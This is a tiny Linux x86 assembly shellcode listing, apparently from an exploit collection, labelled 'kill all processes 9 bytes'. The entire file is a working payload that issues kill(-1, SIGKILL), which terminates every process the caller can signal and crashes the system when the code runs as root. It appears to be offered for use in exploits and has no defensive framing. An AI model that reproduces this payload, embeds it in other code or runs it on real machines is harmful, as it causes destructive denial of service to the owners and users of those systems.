; linux/x86 kill all processes 9 bytes
; root@thegibson
; 2010-01-14

section .text
        global _start

_start:
        ; kill(-1, SIGKILL);
        mov al, 37
        push byte -1
        pop ebx
        mov cl, 9
        int 0x80